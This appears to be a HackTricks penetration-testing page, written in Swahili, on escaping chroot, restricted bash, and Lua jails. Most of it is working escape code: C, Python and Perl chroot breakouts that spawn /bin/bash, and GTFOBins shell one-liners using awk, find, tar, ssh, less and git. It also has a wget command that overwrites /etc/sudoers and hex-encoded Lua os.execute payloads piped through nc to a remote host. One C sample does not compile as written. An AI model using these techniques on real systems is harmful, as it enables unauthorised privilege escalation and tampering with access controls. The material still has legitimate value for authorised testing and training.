# Kutoroka kutoka kwenye Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Tafuta katika** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **ikiwa unaweza kutekeleza binary yoyote yenye property ya "Shell"**

## Kutoroka kutoka Chroot

Kutoka [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Utaratibu wa chroot **haujakusudiwa kujilinda** dhidi ya kuchezewa kimakusudi na **watumiaji wenye privileges** (**root**). Kwenye mifumo mingi, mazingira ya chroot hayawekwi kwa mpangilio sahihi, na programu zilizo ndani ya chroot **zenye privileges za kutosha zinaweza kufanya chroot ya pili ili kutoroka**.\
Kwa kawaida hii inamaanisha kwamba ili kutoroka unahitaji kuwa root ndani ya chroot.

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) iliundwa kutumia vibaya matukio yafuatayo na kutoroka kutoka `chroot`.

### Root + CWD

> [!WARNING]
> Ikiwa wewe ni **root** ndani ya chroot, **unaweza kutoroka** kwa kuunda **chroot nyingine**. Hii ni kwa sababu chroot mbili haziwezi kuwepo kwa wakati mmoja (kwenye Linux), kwa hiyo ukitengeneza folder na kisha **kuunda chroot mpya** kwenye folder hiyo mpya huku **ukiwa nje yake**, sasa utakuwa **nje ya chroot mpya** na hivyo utakuwa kwenye FS.
>
> Hii hutokea kwa sababu kwa kawaida chroot HAIBADILISHI working directory yako kuwa ile iliyoonyeshwa, kwa hiyo unaweza kuunda chroot lakini ukawa nje yake.

Kwa kawaida hutapata binary ya `chroot` ndani ya chroot jail, lakini **unaweza ku-compile, ku-upload na kutekeleza** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Hii inafanana na hali ya awali, lakini katika hali hii **mshambuliaji huhifadhi file descriptor inayoelekeza kwenye current directory** kisha **huunda chroot kwenye folder jipya**. Mwishowe, kwa kuwa ana **access** ya hiyo **FD** **nje ya chroot**, anaifikia na **hutoka ndani yake**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD inaweza kupitishwa kupitia Unix Domain Sockets, kwa hiyo:
>
> - Unda child process (fork)
> - Unda UDS ili parent na child ziweze kuwasiliana
> - Endesha chroot kwenye child process katika folder tofauti
> - Katika parent proc, unda FD ya folder iliyo nje ya chroot mpya ya child proc
> - Pitisha FD hiyo kwa child proc ukitumia UDS
> - Child process itumie chdir kwenye FD hiyo, na kwa kuwa iko nje ya chroot yake, itaepuka jail

### Root + Mount

> [!WARNING]
>
> - Mount root device (/) kwenye directory iliyo ndani ya chroot
> - Fanya chroot kwenye directory hiyo
>
> Hili linawezekana katika Linux

### Root + /proc

> [!WARNING]
>
> - Mount procfs kwenye directory iliyo ndani ya chroot (ikiwa bado haijawekwa)
> - Tafuta pid iliyo na entry tofauti ya root/cwd, kama: /proc/1/root
> - Fanya chroot kwenye entry hiyo

### Root(?) + Fork

> [!WARNING]
>
> - Unda Fork (child proc), kisha fanya chroot kwenye folder tofauti iliyo ndani zaidi katika FS na ufanye CD humo
> - Kutoka kwenye parent process, hamisha folder ambayo child process iko ndani yake hadi kwenye folder iliyotangulia chroot ya child
> - Child process hii itajikuta iko nje ya chroot

### ptrace

> [!WARNING]
>
> - Zamani users wangeweza ku-debug processes zao wenyewe kutoka kwenye process yao wenyewe... lakini hili haliwezekani tena kwa default
> - Hata hivyo, ikiwa inawezekana, unaweza kutumia ptrace kuingia kwenye process na ku-execute shellcode ndani yake ([see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Pata maelezo kuhusu jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Rekebisha PATH

Angalia kama unaweza kurekebisha variable ya mazingira ya PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Kutumia vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers na help viewers

Mazingira mengi yenye vikwazo bado huacha **pagers** au **help viewers** zikiwa zinapatikana. Kwa kawaida, ni rahisi kuzitumia vibaya kuliko kujaribu kujenga upya `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Ikiwa `git` inapatikana, kumbuka kwamba matokeo yake ya help kwa kawaida hupitia kwenye pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### One-liners za kawaida za GTFOBins

Baada ya kujua ni binaries zipi zinazoweza kufikiwa, jaribu kwanza shell spawners zilizo wazi:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Ikiwa unaweza tu **kuingiza arguments** kwenye command iliyoruhusiwa (badala ya kuiendesha bila vikwazo), pia angalia **GTFOArgs**.

### Unda script

Angalia ikiwa unaweza kuunda faili inayoweza kutekelezwa yenye _/bin/bash_ kama maudhui yake
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Pata bash kupitia SSH

Ikiwa unaingia kupitia ssh, mara nyingi unaweza kuiomba server itekeleze **programu tofauti** badala ya restricted login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Ikiwa `ssh` ni mojawapo ya binaries chache zinazoruhusiwa locally, kumbuka kwamba inaweza pia kutumiwa vibaya kama **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Unaweza kuandika juu ya, kwa mfano, faili ya sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Baadhi ya mazingira hayakuingizii kwenye `rbash` ya kawaida, bali kwenye **wrappers** kama `git-shell`, `rssh`, au `lshell`:

- `git-shell` inakubali tu server-side Git commands pamoja na chochote kilichopo ndani ya `~/git-shell-commands/`. Ikiwa directory hiyo ipo, endesha `help` ili kuorodhesha custom actions zinazoruhusiwa. Ikiwa unaweza **write** humo, executable yoyote utakayoweka kwenye directory hiyo itafikika.
- `rssh` / `lshell` kwa kawaida huruhusu `scp`, `sftp`, `rsync`, au operations za mtindo wa Git pekee. Katika hali hizo, lenga **file write primitives** kwanza: upload `authorized_keys`, shell startup file, au helper script kwenye location inayoweza kuandikwa, kisha reconnect kwa `ssh -t ...`.
- Ikiwa wrapper inachuja command line pekee, orodhesha binaries zinazofikika kisha pivot kurudi kwenye **GTFOBins / GTFOArgs**.

### Other tricks

Pia angalia:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Huenda pia ukurasa huu ukawa wa kuvutia:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Tricks kuhusu kutoroka kutoka kwenye python jails zinapatikana kwenye ukurasa ufuatao:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Kwenye ukurasa huu unaweza kupata global functions unazoweza kutumia ndani ya lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Baadhi ya mbinu za **kuita functions za library bila kutumia dots**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Orodhesha functions za library:
```bash
for k,v in pairs(string) do print(k,v) end
```
Kumbuka kwamba kila mara unapotekeleza one liner ya awali katika **lua environment tofauti, mpangilio wa functions hubadilika**. Kwa hivyo, ikiwa unahitaji kutekeleza function fulani, unaweza kufanya brute force attack kwa kupakia lua environments tofauti na kuita function ya kwanza ya library:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Pata interactive lua shell**: Ikiwa uko ndani ya limited lua shell, unaweza kupata lua shell mpya (na tunatumaini isiyo na mipaka) kwa kuita:
```bash
debug.debug()
```
## Marejeleo

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
